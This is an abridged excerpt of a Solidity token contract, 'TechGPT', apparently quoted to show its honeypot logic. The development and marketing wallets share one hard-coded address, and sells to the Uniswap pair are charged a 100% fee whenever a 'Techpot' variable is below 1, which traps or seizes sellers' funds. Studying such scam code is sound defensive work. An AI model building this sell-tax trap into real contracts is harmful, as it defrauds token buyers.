...
contract TechGPT is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0xe74D8babffDdfFd443FC9f445dFcdaA90a81709C);
    address payable private _marketingAddress = payable(0xe74D8babffDdfFd443FC9f445dFcdaA90a81709C);
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router) ) {
                ...
                _taxFee = Techpot >= 1 ? _taxFeeOnSell : 100;
            }
        }
